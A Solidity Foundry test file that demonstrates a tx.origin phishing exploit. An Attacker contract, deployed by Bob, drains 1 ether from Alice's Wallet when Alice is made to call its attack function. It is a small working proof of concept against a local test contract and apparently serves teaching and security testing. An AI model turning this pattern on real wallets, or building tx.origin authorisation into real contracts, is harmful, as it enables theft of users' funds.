//SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {Wallet} from "../src/TxOrigin.sol";
import {console} from "forge-std/console.sol";

contract TxOriginTest is Test {
    Wallet  wallet;
    Attacker  attacker;

    address Alice = address(0x123);
    address Bob = address(0x456);

    function setUp() public {
        vm.deal(Alice, 10 ether);
        vm.deal(Bob, 1 ether);

        console.log("Alice balance beforedeployment of contract: ", address(Alice).balance);

        vm.prank(Alice);
        wallet = new Wallet{value: 10 ether}();

        console.log("Alice balance after deployment of contract : ", address(Alice).balance);
        

        vm.prank(Bob);
        attacker = new Attacker(address(wallet));
        
        
    }

    function testPhishingExploit() public {

        console.log("Owner of the contract before attack :" , wallet.owner());
        console.log("Bob balance before attack :", address(Bob).balance);
        

        vm.prank(Alice , Alice);
        attacker.attack();

        console.log("Owner of the contract after attack :" , attacker.owner());
        console.log("Bob balance after attack :", address(Bob).balance);
    }
    receive() external payable {}
}

contract Attacker {
    address payable public owner;
    Wallet wallet;

    constructor(address _wallet) {
        owner = payable(msg.sender);
        wallet = Wallet(_wallet);
    }

    function attack() public {
        wallet.transfer(owner, 1 ether);
    }
}
